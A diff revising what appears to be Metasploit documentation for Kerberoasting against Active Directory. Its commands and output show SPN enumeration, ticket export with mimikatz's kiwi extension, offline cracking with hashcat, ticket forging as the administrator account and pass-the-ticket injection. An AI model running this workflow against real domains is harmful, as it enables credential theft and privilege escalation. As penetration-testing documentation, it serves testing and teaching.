@@ -1,44 +1,48 @@
-
-## Vulnerable Application
-
-Any system leveraging kerberos as a means of authentication e.g. Active Directory, MSSQL
-
-## Verification Steps
-
-1. Start msfconsole
-3. Obtain SPNs from your target
-	1. Do: `use auxiliary/gather/ldap_query`
-	2. Do: `set action ENUM_USER_SPNS_KERBEROAST`
-	3. Run the module and note the discovered SPNs
-4.  Request Service Tickets using the kiwi extension
-	1. Do: `load kiwi`
-	2. Do: `kerberos_ticket_list`
-5. Export service tickets using the kiwi extionsion
-	1. Do: `kiwi_cmd kerberos::list /export`
-6. Crack the encryped password in the service ticket using tgsrepcrack.py (more info on this python script below)
-	1. Do:  `python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi`
-7. Rewrite the service tickets using kerberoast.py (more info on this python script below)
-	1. Do:  `python3  kerberoast.py -p N0tpassword!
-	    -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
-8. Finally inject the ticket back into RAM using meterpreter's kiwi extension
-	1. `meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi`
-
 ## Kerberoasting
 
-Kerberoasting is a post-exploitation technique that tries to crack the password of a service acount withtin Active
-Directory. The attacker requests a ticket while pretending to be an account user with a service principal name (SPN),
-which contains an encrypted password. Once recieved, the attacker attemps to crack the password hash.
+Kerberoasting is a technique that finds Service Principal Names (SPN) in Active Directory that are associated with
+normal user accounts on the domain, and then requesting Ticket Granting Service (TGS) tickets for those accounts from
+the KDC. These TGS tickets are encrypted with the Service's password, which may be weak - and susceptible to brute force
+attacks.
 
-If successful, the attacker possess user credentials that can be used to impersonate the account owner. Now the attacker
-appears to be an approved and legitimate user and has unrestricted access to any assets, systems or networks granted
-to the compromised account, boom roasted.
+Services are normally configured to use computer accounts which have very long and secure passwords, but services
+associated with normal user accounts will have passwords entered by a human and may be short and weak - and a good
+target for brute attacks.
+
+If successful, the attacker possesses user credentials that can be used to impersonate the account owner. Now the attacker
+appears to be an approved and legitimate user - having access to the same privileges, assets, systems, etc, that have
+been granted to the compromised account, boom roasted.
+
+## Vulnerable Targets
+
+Any system leveraging Kerberos as a means of authentication e.g. Active Directory, MSSQL, which have Service Principal
+Names (SPN) associated with normal user accounts on the domain.
+
+## Module usage
+
+1. Start msfconsole
+2. Obtain SPNs associated with user accounts from your target
+    1. Do: `use auxiliary/gather/ldap_query`
+    2. Do: `set action ENUM_USER_SPNS_KERBEROAST`
+    3. Run the module and note the discovered SPNs
+3. If you have a Meterpreter session want to use mimikatz support:
+    1. Do: `load kiwi`
+    2. Do: `kerberos_ticket_list`
+4. Export service tickets using the kiwi extension
+    1. Do: `kiwi_cmd kerberos::list /export`
+5. Crack the encryped password in the service ticket using tgsrepcrack.py (more info on this python script below)
+    1. Do:  `python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi`
+6. Rewrite the service tickets using kerberoast.py (more info on this python script below)
+    1. Do:  `python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
+7. Finally inject the ticket back into RAM using Meterpreter's kiwi extension
+    1. `meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi`
 
 ## Scenarios
 
 ### SPN Discovery
 
-First an SPN needs to be found. This can be done in a number of ways including using metasploit's
-very own ldap_query module :
+First an SPN needs to be found. This can be done in a number of ways - including using metasploit's
+very own `auxiliary/gather/ldap_query` module:
 
 ```
 msf6 > use auxiliary/gather/ldap_query
@@ -96,9 +100,11 @@ CN=LESSIE_PHILLIPS OU=Test OU=GOO OU=Stage DC=example DC=com
 
 Great, we now have a couple SPNs to move forward with.
 
-### Request Service Tickets
+### Request Service Tickets - with kiwi
 
-We can request a Service Ticket using the kiwi extension in metasploit and one of the SPNs found above:
+If you have a running Meterpreter session you can request a Service Ticket using the kiwi extension and one of the SPNs
+found above:
+
 ```
 meterpreter > load kiwi
 Loading extension kiwi...
@@ -127,6 +133,7 @@ Asking for: https/TSTWLPT1000000
 ```
 
 Tickets in the current session can be viewed like so:
+
 ```
 
 meterpreter > kerberos_ticket_list
@@ -145,6 +152,7 @@ meterpreter > kerberos_ticket_list
 ```
 
 ### Export Service Tickets
+
 ```
 meterpreter > kiwi_cmd kerberos::list /export
 
@@ -195,15 +203,15 @@ MDAwMA==
    * Saved to file     : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
 ```
 
-
 ### Crack Service Tickets
 
 To crack the service ticket a number of tools can be used. In this example we'll use hashcat. First we need to convert
 the ticket we retrieved in the `.kirbi` format to a format parsable by hashcat. The script **kirbi2john** is part of
 [Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit is perfect for
-this task. 
+this task.
 
-First clone the repo then run the script against the `.kirbi` file. 
+First clone the repo then run the script against the `.kirbi` file.
+
 ```
 msfuser@ubuntu:~/git$ git clone https://github.com/nidem/kerberoast.git
 msfuser@ubuntu:~/git$ cd kerberoast
@@ -237,7 +245,7 @@ Copy the above hash to a file called hash.txt.
 
 Ensure hashcat is installed: `msfuser@ubuntu:~/git/kerberoast$ sudo apt install hashcat`
 
-With a word list of your choice run the following command: 
+With a word list of your choice run the following command:
 
 ```
 msfuser@ubuntu:~/git/kerberoast$ hashcat -m 13100 --force -a 0 hash.txt wordlist.txt
@@ -305,6 +313,7 @@ Candidates.1.....: test123  -> N0tpassword!
 ```
 
 If you want to view the hash + cracked password at a later date run the above command with `--show` appended.
+
 ```
 msfuser@ubuntu:~/git/kerberoast$ hashcat -m 13100 --force -a 0 hash.txt wordlist.txt --show
 $krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cdd9cfb11a00a9b03a0d31$76975a9115860927140
@@ -322,7 +331,6 @@ escalation is also possible as the user can be added into an elevated group such
 ```
 ➜  kerberoast git:(master) ✗ python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500
 ```
-
 
 The new ticket can be injected back into the memory with the following Mimikatz command in order to perform
 authentication with the targeted service via Kerberos protocol.
